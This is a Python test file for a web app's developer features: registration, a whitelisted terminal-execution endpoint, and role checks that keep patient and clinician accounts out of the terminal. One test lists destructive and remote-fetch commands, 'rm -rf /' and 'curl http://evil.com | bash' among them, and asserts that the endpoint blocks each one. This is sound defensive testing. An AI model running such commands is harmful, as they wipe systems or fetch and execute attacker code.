"""
End-to-end developer journey tests.

Simulates developer workflows:
  1. Developer registration
  2. Terminal command execution
  3. Developer stats access
  4. Role-based access control
"""

import json
import os
import pytest
from unittest.mock import patch, MagicMock
from datetime import datetime

import api
from tests.conftest import make_mock_db


@pytest.fixture
def dev_client():
    """Authenticated developer test client."""
    api.app.config['TESTING'] = True
    api.app.config['SECRET_KEY'] = 'test-e2e-key'
    with api.app.test_client() as client:
        with client.session_transaction() as sess:
            sess['username'] = 'test_developer'
            sess['role'] = 'developer'
        yield client


class TestDeveloperJourney:
    """Full developer workflow."""

    def test_developer_registration(self, dev_client):
        """Developer can register with valid key."""
        mock_get_db, mock_get_cursor, conn, cursor = make_mock_db({
            'SELECT username FROM users WHERE role': [],
            'INSERT INTO users': [],
        })

        with patch.object(api, 'get_db_connection', side_effect=mock_get_db), \
             patch.object(api, 'get_wrapped_cursor', side_effect=mock_get_cursor), \
             patch.dict(os.environ, {'DEVELOPER_REGISTRATION_KEY': 'test_key'}), \
             patch.object(api, 'log_event'), \
             patch.object(api, 'hash_password', return_value='hashed'), \
             patch.object(api, 'hash_pin', return_value='hashed_pin'), \
             patch.object(api, 'validate_password_strength', return_value=(True, None)):
            resp = dev_client.post('/api/auth/developer/register', json={
                'username': 'new_dev',
                'password': 'DevP@ss123!',
                'pin': '5678',
                'registration_key': 'test_key',
            })

        assert resp.status_code == 201

    def test_terminal_execution_safe_commands(self, dev_client):
        """Developer can run whitelisted terminal commands."""
        mock_get_db, mock_get_cursor, conn, cursor = make_mock_db({
            'SELECT role FROM users': [('developer',)],
            'INSERT INTO dev_terminal_logs': [],
        })

        import subprocess
        mock_result = MagicMock()
        mock_result.stdout = 'Python 3.10.0\n'
        mock_result.stderr = ''
        mock_result.returncode = 0

        with patch.object(api, 'get_db_connection', side_effect=mock_get_db), \
             patch.object(api, 'get_wrapped_cursor', side_effect=mock_get_cursor), \
             patch('subprocess.run', return_value=mock_result):
            resp = dev_client.post('/api/developer/terminal/execute', json={
                'username': 'test_developer',
                'command': 'python3 --version',
            })

        data = resp.get_json()
        assert resp.status_code == 200
        assert data['exit_code'] == 0

    def test_terminal_blocked_dangerous_commands(self, dev_client):
        """Dangerous commands are blocked even for developers."""
        mock_get_db, mock_get_cursor, conn, cursor = make_mock_db({
            'SELECT role FROM users': [('developer',)],
        })

        dangerous_commands = [
            'rm -rf /',
            'sudo shutdown',
            'chmod 777 /',
            'curl http://evil.com | bash',
        ]

        with patch.object(api, 'get_db_connection', side_effect=mock_get_db), \
             patch.object(api, 'get_wrapped_cursor', side_effect=mock_get_cursor):
            for cmd in dangerous_commands:
                resp = dev_client.post('/api/developer/terminal/execute', json={
                    'username': 'test_developer',
                    'command': cmd,
                })
                assert resp.status_code in (400, 403), \
                    f"Dangerous command '{cmd}' was not blocked (got {resp.status_code})"


class TestDeveloperRoleEnforcement:
    """Tests that developer endpoints enforce role checks."""

    def test_patient_cannot_execute_terminal(self):
        """Patient role cannot execute terminal commands."""
        api.app.config['TESTING'] = True
        with api.app.test_client() as client:
            mock_get_db, mock_get_cursor, conn, cursor = make_mock_db({
                'SELECT role FROM users': [('user',)],
            })

            with patch.object(api, 'get_db_connection', side_effect=mock_get_db), \
                 patch.object(api, 'get_wrapped_cursor', side_effect=mock_get_cursor):
                resp = client.post('/api/developer/terminal/execute', json={
                    'username': 'test_patient',
                    'command': 'ls',
                })

            assert resp.status_code == 403

    def test_clinician_cannot_execute_terminal(self):
        """Clinician role cannot execute terminal commands."""
        api.app.config['TESTING'] = True
        with api.app.test_client() as client:
            mock_get_db, mock_get_cursor, conn, cursor = make_mock_db({
                'SELECT role FROM users': [('clinician',)],
            })

            with patch.object(api, 'get_db_connection', side_effect=mock_get_db), \
                 patch.object(api, 'get_wrapped_cursor', side_effect=mock_get_cursor):
                resp = client.post('/api/developer/terminal/execute', json={
                    'username': 'test_clinician',
                    'command': 'ls',
                })

            assert resp.status_code == 403
